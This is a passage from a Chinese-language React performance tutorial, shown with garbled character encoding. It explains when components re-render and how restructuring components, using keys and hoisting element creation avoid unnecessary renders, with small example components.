<p><strong>æ³¨æ„ï¼š</strong> ä½ çœ‹åˆ°äº†renderTimesæ¯æ¬¡éƒ½ä¼šåŠ  2ï¼Œè¿™ä¸æ˜¯ bugï¼Œåœ¨ React çš„å¼€å‘æ¨¡å¼ä¸­ï¼Œæ¯æ¬¡æ›´æ–°éƒ½ä¼šæ¸²æŸ“ä¸¤æ¬¡ï¼Œä»¥ä¾¿äºæ£€æŸ¥ä½ å†™çš„useEffectæœ‰æ²¡æœ‰æ­£ç¡®æ¶ˆé™¤ effectï¼Œ <a href="https://link.juejin.cn?target=https%3A%2F%2Flegacy.reactjs.org%2Fdocs%2Fstrict-mode.html%23ensuring-reusable-state" target="_blank" title="https://link.juejin.cn?target=https%3A%2F%2Flegacy.reactjs.org%2Fdocs%2Fstrict-mode.html%23ensuring-reusable-state">å®˜æ–¹æ–‡æ¡£</a>ã€‚</p>
<p><strong>å°ç»“</strong></p>
<ul>
<li>è™½ç„¶ React çš„æ›´æ–°ä¼šä»æ ¹èŠ‚ç‚¹å¼€å§‹éå†ï¼Œä½†æ˜¯åªæœ‰æ›´æ–°èŠ‚ç‚¹çš„å­æ ‘ä¼šè¢«é‡æ–°æ¸²æŸ“ï¼Œç¥–å…ˆèŠ‚ç‚¹ä¸ä¼šè¢«é‡æ–°æ¸²æŸ“</li>
<li>å³ä¾¿æ›´æ–°èŠ‚ç‚¹çš„å­èŠ‚ç‚¹æ²¡æœ‰ä»»ä½•å˜åŒ–ï¼Œä¹Ÿä¼šè¢«é‡æ–°æ¸²æŸ“</li>
</ul>
<h3 data-id="heading-2">è§„é¿æ¸²æŸ“</h3>
<p>ç°åœ¨æˆ‘ä»¬çŸ¥é“ React æ›´æ–°æ¸²æŸ“çš„åŸºæœ¬è§„åˆ™ï¼Œæ¥ä¸‹å»è¦è®¨è®ºçš„å°±æ˜¯å¦‚ä½•è¿›è¡Œä¼˜åŒ–ã€‚</p>
<p>ä½†åœ¨æ­£å¼å¼€å§‹ä¹‹å‰ï¼Œæˆ‘ä»¬è¦çŸ¥é“çš„æ˜¯ï¼Œå³ä¾¿ä½ ä¸åšä»»ä½•ä¼˜åŒ–ï¼Œå¯¹äºå¤§éƒ¨åˆ†çš„åº”ç”¨æ¥è¯´ï¼ŒReact çš„æ€§èƒ½ä¹Ÿæ˜¯å¤Ÿç”¨çš„ï¼Œä½ æŠŠå„ç§ä¼˜åŒ–åŠ ä¸Šæœ‰æ—¶å€™åè€Œä¼šé€‚å¾—å…¶åï¼Œ è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå¾ˆå¤šå¼€å‘è€…å…¶å®å¹¶ä¸å®Œå…¨ç†è§£ React çš„æ›´æ–°æœºåˆ¶ï¼Œç”šè‡³ä¸€äº›ç†è§£çš„å¼€å‘è€…ä¹Ÿå¹¶ä¸èƒ½ç¬¬ä¸€çœ¼å°±çœ‹å‡ºä»£ç æ˜¯å¦æœ‰ä¼˜åŒ–ç©ºé—´ï¼Œ ä½†æ˜¯ React ä»ç„¶æ˜¯ä¸–ç•Œä¸Šä½¿ç”¨æœ€å¤šçš„å‰ç«¯æ¡†æ¶ï¼Œå¹¶ä¸”å¤§éƒ¨åˆ†ç”¨å…¶å¼€å‘çš„åº”ç”¨éƒ½æ˜¯æ­£å¸¸è¿è¡Œçš„ã€‚</p>
<p><strong>æ‰€ä»¥å¾ˆå¤šæ—¶å€™ï¼Œè€Œæ˜¯å…ˆä¸“æ³¨äºå®ç°ï¼Œç„¶åå›è¿‡å¤´å»ç”¨ Profiler è¿™ç±»å·¥å…·å»åˆ†æä½ çš„åº”ç”¨ï¼Œ ç„¶åå†é’ˆå¯¹æœ‰æ€§èƒ½é—®é¢˜çš„åœ°æ–¹å»åšä¼˜åŒ–ï¼Œè¿™æ ·çš„åšæ³•åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹æ˜¯æ›´æœ‰æ•ˆä¸”é«˜æ•ˆçš„ã€‚</strong></p>
<h4 data-id="heading-3">é‡æ–°æ€è€ƒä½ çš„ç»„ä»¶ç»“æ„</h4>
<p>æˆ‘ä»¬æ¥çœ‹ä¸‹é¢ä¸€ä¸ªä¾‹å­</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcodesandbox.io%2Fs%2Fflamboyant-https-yylfcm%3Ffile%3D%2Fsrc%2FApp.tsx" target="_blank" title="https://codesandbox.io/s/flamboyant-https-yylfcm?file=/src/App.tsx" ref="nofollow noopener noreferrer">codesandbox.io/s/flamboyanâ€¦</a></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;

<span class="hljs-keyword">let</span> menuRenderTime = <span class="hljs-number">0</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Menu</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span>Menu Render Times: {menuRenderTime++}<span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span></span>;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Nav</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> [theme, setTheme] = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">useState</span>(<span class="hljs-string">"light"</span>);

    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">Menu</span> /&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span>
                <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setTheme(theme === "light" ? "dark" : "light")}
            &gt;
                Theme: {theme}
            <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    );
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">Nav</span> /&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>Content<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    );
}
</code></pre>
<p>è¿™æ˜¯ä¸€ä¸ªéå¸¸å¸¸è§çš„ä¾‹å­ï¼Œæˆ‘ä»¬çš„åº”ç”¨åŒ…å«äº†ä¸€ä¸ªå¯¼èˆªæ ï¼Œå¯¼èˆªæ é‡Œé¢æœ‰ä¸€ä¸ªèœå•ï¼ŒåŒæ—¶å¯¼èˆªæ è¿˜åŒ…å«ä¸€ä¸ªåˆ‡æ¢ä¸»é¢˜çš„æŒ‰é’®ï¼Œ æˆ‘ç›¸ä¿¡å¤§éƒ¨åˆ†äººåœ¨é‡åˆ°è¿™ä¹ˆä¸€ä¸ªéœ€æ±‚çš„æ—¶å€™ï¼Œç¬¬ä¸€ååº”åº”è¯¥ä¹Ÿå°±æ˜¯è¿™ä¹ˆå»å®ç°ï¼Œè€Œåœ¨è¿™ä¸ªä¾‹å­é‡Œå°±éšè—ç€ä¸€ä¸ªå¯ä»¥ä¼˜åŒ–çš„åœ°æ–¹ã€‚ æˆ‘ä»¬å…ˆæ¥çœ‹è¿™ä¸ªä¾‹å­ï¼Œç°åœ¨ç‚¹å‡»åˆ‡æ¢ä¸»é¢˜æ—¶ï¼ŒMenuç»„ä»¶æ¯æ¬¡éƒ½ä¼šé‡æ–°æ¸²æŸ“ï¼Œå¾ˆæ˜¾ç„¶ç¬¦åˆæˆ‘ä¸Šé¢è¯´åˆ°çš„å­ç»„ä»¶ä¼šå› ä¸ºç¥–å…ˆç»„ä»¶çš„æ¸²æŸ“è€Œé‡æ–°æ¸²æŸ“ã€‚</p>
<p>è€Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç®€å•åœ°è°ƒæ•´Navå’ŒMenuä¹‹é—´çš„å…³ç³»æ¥è§„é¿è¿™ä¸ªé—®é¢˜ï¼Œè¿™å°±æ˜¯ renderPropsï¼Œæ¥çœ‹æˆ‘å¦‚ä½•æ”¹é€ ç»„ä»¶</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcodesandbox.io%2Fp%2Fsandbox%2Fdts559%3Ffile%3D%252Fsrc%252FApp.js%253A17%252C11" target="_blank" title="https://codesandbox.io/p/sandbox/dts559?file=%2Fsrc%2FApp.js%3A17%2C11" ref="nofollow noopener noreferrer">codesandbox.io/p/sandbox/dâ€¦</a></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;

<span class="hljs-keyword">let</span> menuRenderTime = <span class="hljs-number">0</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Menu</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span>Menu Render Times: {menuRenderTime++}<span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span></span>;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Nav</span>(<span class="hljs-params">{ renderMenu }</span>) {
    <span class="hljs-keyword">const</span> [theme, setTheme] = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">useState</span>(<span class="hljs-string">"light"</span>);

    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            {renderMenu}
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span>
                <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setTheme(theme === "light" ? "dark" : "light")}
            &gt;
                Theme: {theme}
            <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    );
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">Nav</span> <span class="hljs-attr">renderMenu</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Menu</span> /&gt;</span>} /&gt;
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>Content<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    );
}
</code></pre>
<p>ç°åœ¨ä½ åˆ‡æ¢ä¸»é¢˜æ—¶Menuç»„ä»¶å°±ä¸ä¼šå†é‡æ–°æ¸²æŸ“äº†ï¼Œè¿™é‡Œå°±åˆ©ç”¨åˆ°äº†ä¸Šé¢æ€»ç»“çš„ç¬¬ä¸€ç‚¹ï¼Œå­ç»„ä»¶çš„æ›´æ–°ä¸ä¼šå¼•èµ·ç¥–å…ˆèŠ‚ç‚¹çš„é‡æ–°æ¸²æŸ“ï¼Œ åœ¨è¿™ä¸ªä¾‹å­é‡Œï¼ŒNavæ˜¯Appçš„å­èŠ‚ç‚¹ï¼Œå…¶æ›´æ–°å¹¶ä¸ä¼šè®©AppèŠ‚ç‚¹é‡æ–°æ¸²æŸ“ï¼Œè€ŒMenuæ˜¯Appæ¸²æŸ“è¿‡ç¨‹ä¸­è¢«åˆ›å»ºçš„ï¼Œ Appæ²¡æœ‰é‡æ–°æ¸²æŸ“ï¼Œè¯´æ˜MenuèŠ‚ç‚¹æ²¡æœ‰è¢«é‡æ–°åˆ›å»ºï¼Œå…¶å¤ç”¨çš„ä»ç„¶æ˜¯ä¸Šä¸€æ¬¡æ¸²æŸ“æ—¶åˆ›å»ºçš„Elementã€‚</p>
<p>æ‰€ä»¥ç»“è®ºå°±æ˜¯ï¼Œç›¸è¾ƒäºï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">C</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> /&gt;</span></span>;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">B</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">C</span> /&gt;</span></span>;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">A</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">B</span> /&gt;</span></span>;
}
</code></pre>
<p>è¿™æ ·é€’å½’åµŒå¥—çš„ç»„ä»¶ç»“æ„ï¼Œæˆ‘æ›´æ¨èè¿™æ ·çš„ç»“æ„ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">C</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> /&gt;</span></span>;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">B</span>(<span class="hljs-params">{ children }</span>) {
    <span class="hljs-keyword">return</span> children;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">A</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">B</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">C</span> /&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">B</span>&gt;</span></span>
    );
}
</code></pre>
<p>åœ¨ React ä¸­ï¼Œ<strong>childrenå…¶å®ä¹Ÿæ˜¯ä¸€ä¸ªprop</strong>ï¼Œåªæ˜¯ä¸€èˆ¬æˆ‘ä»¬ä¹ æƒ¯æŠŠ children å’Œ props åˆ†å¼€æ¥å¯¹å¾…ï¼Œæ‰€ä»¥å¾ˆå¤šåŒå­¦å¯èƒ½ä¼šä¸‹æ„è¯†åœ°è®¤ä¸º children å’Œ props æ˜¯ä¸åŒçš„ä¸œè¥¿ã€‚</p>
<p>é‚£ä¹ˆå½’ç»“åˆ°è¿™ä¸ªä¾‹å­é‡Œé¢ï¼Œå› ä¸ºAppèŠ‚ç‚¹æ²¡æœ‰é‡æ–°æ¸²æŸ“ï¼Œæ‰€ä»¥æˆ‘ä»¬æ²¡æœ‰é‡æ–°åˆ›å»ºMenuç»„ä»¶åœ°èŠ‚ç‚¹ï¼ˆé€šè¿‡createElementï¼‰ï¼Œå› æ­¤ Nav ç»„ä»¶çš„ props æ˜¯æ²¡æœ‰ä»»ä½•å˜åŒ–çš„ï¼Œ <strong>ä»–æ‹¿åˆ°çš„ Menu ç»„ä»¶çš„ Element å’Œå‰ä¸€æ¬¡æ¸²æŸ“çš„æ˜¯å®Œå…¨ç›¸åŒçš„å®ä¾‹ï¼</strong> è€Œè¿™æ‰æ˜¯åœ¨è¿™ç§ case ä¸‹é¢ C èŠ‚ç‚¹æ²¡æœ‰é‡æ–°æ¸²æŸ“çš„æ ¹æœ¬åŸå› ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»£ç æ¥è¿›è¡ŒéªŒè¯ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcodesandbox.io%2Fp%2Fsandbox%2F4gp4vy%3Ffile%3D%252Fsrc%252FApp.js%253A24%252C5" target="_blank" title="https://codesandbox.io/p/sandbox/4gp4vy?file=%2Fsrc%2FApp.js%3A24%2C5" ref="nofollow noopener noreferrer">codesandbox.io/p/sandbox/4â€¦</a></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;

<span class="hljs-keyword">let</span> menuRenderTime = <span class="hljs-number">0</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Menu</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span>Menu Render Times: {menuRenderTime++}<span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span></span>;
}

<span class="hljs-keyword">let</span> lastMenuElement = <span class="hljs-literal">null</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Nav</span>(<span class="hljs-params">{ renderMenu }</span>) {
    <span class="hljs-keyword">const</span> [theme, setTheme] = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">useState</span>(<span class="hljs-string">"light"</span>);

    <span class="hljs-title class_">React</span>.<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
        lastMenuElement = renderMenu;
    }, [renderMenu]);

    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            {renderMenu}
            Menu Changed: {renderMenu === lastMenuElement ? "No" : "Yes"}
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span>
                <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setTheme(theme === "light" ? "dark" : "light")}
            &gt;
                Theme: {theme}
            <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    );
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">Nav</span> <span class="hljs-attr">renderMenu</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">Menu</span> /&gt;</span>} /&gt;
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>Content<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    );
}
</code></pre>
<h6 data-id="heading-4">owner vs children</h6>
<p>åœ¨ä¸Šé¢çš„ä¾‹å­é‡Œï¼ŒMenu èŠ‚ç‚¹çš„ owner æ˜¯ Appï¼Œè€Œå®ƒæ˜¯ Nav èŠ‚ç‚¹çš„ childrenï¼Œæ‰€ä»¥è¿™é‡Œå¼•å‡ºä¸€ä¸ªç»“è®ºï¼š</p>
<p><strong>èŠ‚ç‚¹æ˜¯å¦é‡æ–°æ¸²æŸ“ä¼šå—åˆ° owner çš„å½±å“ï¼Œä½†å’Œ parent å¹¶ä¸æ˜¯ç›´æ¥ç›¸å…³ã€‚</strong></p>
<p>ç†è§£ owner å’Œ children çš„åŒºåˆ«å¯¹äºç†è§£ React çš„ä¸€äº›æ¦‚å¿µè¿˜æ˜¯éå¸¸æœ‰å¸®åŠ©çš„ï¼Œä½†æ˜¯ React å®˜æ–¹å…¶å®å¹¶æ²¡æœ‰ç»™å‡ºè¿™æ ·çš„æ¦‚å¿µï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘åªæ˜¯ç»™å‡ºäº†ä¸€ä¸ªæ¯”è¾ƒå½¢è±¡çš„å›¾ç¤ºï¼Œ</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45162ed3e9024766a7c6f0f0b24aec9b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVGlmZmFueQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770892093&amp;x-signature=UTwhT8eiBXEVD6vpGwRbobEjtpo%3D" alt="" loading="lazy"/></p>
<p>ç®€å•æ¥è¯´ï¼Œowner å°±æ˜¯åˆ›å»ºå½“å‰èŠ‚ç‚¹çš„èŠ‚ç‚¹ï¼Œæ¯”å¦‚åœ¨è¿™ä¸ªä¾‹å­é‡Œçš„Menuï¼Œä»–çš„åˆ›å»ºåœ¨Appä¸­æ—¶ï¼Œä»–çš„ owner å°±æ˜¯Appï¼Œè€Œå¦‚æœæ˜¯åœ¨ Nav é‡Œé¢ï¼Œåˆ™ owner æ˜¯ Navã€‚ å¯¹æ¯”è¿™ä¸ªç»“æœæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå½±å“MenuèŠ‚ç‚¹æ˜¯å¦é‡æ–°æ¸²æŸ“çš„æ ¹æœ¬åŸå› ï¼Œæ˜¯å…¶ owner æ˜¯å¦é‡æ–°æ¸²æŸ“ï¼Œå› ä¸ºä¸€æ—¦ owner é‡æ–°æ¸²æŸ“ï¼Œå°±ä¼šå¼•èµ·MenuèŠ‚ç‚¹çš„é‡æ–°åˆ›å»ºï¼Œ å°±ä¼šè®©MenuèŠ‚ç‚¹éœ€è¦è¢«é‡æ–°æ¸²æŸ“ã€‚</p>
<p>é‚£ä¹ˆæ˜¯ä¸æ˜¯åªè¦èŠ‚ç‚¹çš„å¯¹è±¡æ²¡æœ‰å˜åŒ–ï¼Œå°±å¯ä»¥è§„é¿é‡æ–°æ¸²æŸ“å‘¢ï¼Ÿæ²¡é”™ï¼Œè¿™å°±æ˜¯æ¥ä¸‹å»æˆ‘ä»¬è¦èŠçš„ç¬¬äºŒç‚¹ã€‚</p>
<h4 data-id="heading-5">ä¿æŒèŠ‚ç‚¹ä¸å˜</h4>
<h5 data-id="heading-6">ä½¿ç”¨keyä¼˜åŒ–èŠ‚ç‚¹å¯¹æ¯”</h5>
<p>åœ¨ React ä¸­ï¼Œ<code>key</code> å±æ€§ç”¨äºä¼˜åŒ– Virtual DOM ä¸­èŠ‚ç‚¹çš„å¯¹æ¯”è¿‡ç¨‹ã€‚å…·ä½“æ¥è¯´ï¼Œ<code>key</code> çš„ä½œç”¨åŒ…æ‹¬ï¼š</p>
<ol>
<li><strong>å”¯ä¸€æ ‡è¯†</strong>:</li>
</ol>
<ul>
<li>
<ul>
<li><code>key</code> ä¸ºæ¯ä¸ªå…ƒç´ æä¾›å”¯ä¸€æ ‡è¯†ï¼Œå¸®åŠ© React åœ¨åˆ—è¡¨æ›´æ–°æ—¶è¯†åˆ«å“ªäº›å…ƒç´ å‘ç”Ÿäº†å˜åŒ–ã€‚</li>
</ul>
</li>
</ul>
<ol start="2">
<li><strong>é«˜æ•ˆæ›´æ–°</strong>:</li>
</ol>
<ul>
<li>
<ul>
<li>å½“ç»„ä»¶æ›´æ–°æ—¶ï¼ŒReact ä½¿ç”¨ <code>key</code> æ¥å¿«é€Ÿåˆ¤æ–­å“ªäº›å…ƒç´ æ˜¯æ–°å¢ã€åˆ é™¤æˆ–ç§»åŠ¨çš„ã€‚</li>
<li>é€šè¿‡ <code>key</code>ï¼ŒReact å¯ä»¥å¤ç”¨ç›¸åŒ <code>key</code> çš„ç»„ä»¶å®ä¾‹ï¼Œé¿å…ä¸å¿…è¦çš„é‡æ–°æ¸²æŸ“ã€‚</li>
</ul>
</li>
</ul>
<ol start="3">
<li><strong>é¿å…ä¸å¿…è¦çš„æ“ä½œ</strong>:</li>
</ol>
<ul>
<li>
<ul>
<li>ä½¿ç”¨ <code>key</code> èƒ½é˜²æ­¢ç”±äºé”™è¯¯å¯¹æ¯”è€Œå¯¼è‡´çš„ç»„ä»¶çŠ¶æ€ä¸¢å¤±æˆ–ä¸å¿…è¦çš„é‡æ’ã€‚</li>
<li>æé«˜æ€§èƒ½ï¼Œå°¤å…¶æ˜¯åœ¨åˆ—è¡¨çš„å…ƒç´ å‘ç”Ÿæ’åºæˆ–é¢‘ç¹æ›´æ–°æ—¶ã€‚</li>
</ul>
</li>
</ul>
<p>æ€»ä¹‹ï¼Œåˆç†ä½¿ç”¨ <code>key</code> å¯ä»¥æ˜¾è‘—æå‡ React åº”ç”¨çš„æ¸²æŸ“æ€§èƒ½å’Œå‡†ç¡®æ€§ã€‚é€šå¸¸å»ºè®®ä½¿ç”¨å”¯ä¸€ä¸”ç¨³å®šçš„æ ‡è¯†ï¼ˆå¦‚æ•°æ®åº“ä¸­çš„ IDï¼‰ä½œä¸º <code>key</code>ã€‚</p>
<h5 data-id="heading-7">å‡å°‘èŠ‚ç‚¹çš„æ— æ•ˆåˆ›å»º</h5>
<p>ä¸¥æ ¼æ¥è¯´ï¼Œä¸Šé¢çš„ä¾‹å­ä¹Ÿå°±æ˜¯ä¿æŒäº†èŠ‚ç‚¹ä¸å˜ï¼Œæ‰€ä»¥è§„é¿äº†MenuèŠ‚ç‚¹çš„æ— ç”¨æ¸²æŸ“ï¼Œåªæ˜¯å› ä¸ºé€ æˆèŠ‚ç‚¹ä¸å˜çš„åŸå› æ¥è‡ª React è‡ªèº«çš„ç®—æ³•ä¼˜åŒ–ï¼Œæ‰€ä»¥æˆ‘å•ç‹¬æ‹¿å‡ºæ¥è¯´ï¼Œ è€Œè¿™ä¸€èŠ‚åˆ™ä¼šå›´ç»•æ›´ common çš„åœºæ™¯æ¥è®²è§£ã€‚æˆ‘ä»¬ä»ç„¶æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼Œè¿™ä¸ªä¾‹å­ä¼šç®€å•å¾ˆå¤šï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcodesandbox.io%2Fp%2Fsandbox%2Fr5qtgt%3Ffile%3D%252Fsrc%252FApp.js%253A10%252C15" target="_blank" title="https://codesandbox.io/p/sandbox/r5qtgt?file=%2Fsrc%2FApp.js%3A10%2C15" ref="nofollow noopener noreferrer">codesandbox.io/p/sandbox/râ€¦</a></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;

<span class="hljs-keyword">let</span> menuRenderTime = <span class="hljs-number">0</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Menu</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">nav</span>&gt;</span>Menu Render Times: {menuRenderTime++}<span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span></span>;
}

<span class="hljs-keyword">const</span> menuElement = <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Menu</span> /&gt;</span></span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);

    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            {menuElement}
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setCount((c) =&gt; c + 1)}&gt;
                Count: {count}
            <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    );
}
</code></pre>
<p>æˆ‘ç®€åŒ–äº†ä¹‹å‰çš„ä¾‹å­ï¼ŒåŒæ ·ä¿æŒäº† Menu ç»„ä»¶ä¸ä¼šéšç€çˆ¶ç»„ä»¶çš„é‡æ–°æ¸²æŸ“è€Œæ¸²æŸ“ï¼Œè€Œè¿™ä¸ªå®ç°å°±éå¸¸ç®€å•ï¼Œæˆ‘æŠŠmenuElementçš„åˆ›å»ºæŒªåˆ°äº†Appç»„ä»¶å¤–é¢ï¼Œ è¿™æ ·çš„ç»“æœæ˜¯ï¼ŒmenuElementçš„åˆ›å»ºåªä¼šå‘ç”Ÿä¸€æ¬¡ï¼Œè€Œä¸ä¼šéšç€Appç»„ä»¶çš„é‡æ–°æ¸²æŸ“è€Œé‡æ–°åˆ›å»ºï¼Œè€Œå€Ÿæ­¤è®©MenuèŠ‚ç‚¹è§„é¿äº†å› ä¸ºç¥–å…ˆèŠ‚ç‚¹çš„é‡æ–°æ¸²æŸ“è€Œå¼•èµ·çš„æ— æ•ˆæ¸²æŸ“ã€‚</p>
<p>éœ€è¦æ³¨æ„è¿™ç§æ–¹å¼å¹¶ä¸ä¼šå¯¼è‡´Menuç»„ä»¶å†…éƒ¨çš„setStateå¤±æ•ˆï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä»£ç æ¥éªŒè¯ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcodesandbox.io%2Fp%2Fsandbox%2Frd3sk3%3Ffile%3D%252Fsrc%252FApp.js%253A19%252C15" target="_blank" title="https://codesandbox.io/p/sandbox/rd3sk3?file=%2Fsrc%2FApp.js%3A19%2C15" ref="nofollow noopener noreferrer">codesandbox.io/p/sandbox/râ€¦</a></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"react"</span>;

<span class="hljs-keyword">let</span> menuRenderTime = <span class="hljs-number">0</span>;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Menu</span>(<span class="hljs-params"/>) {
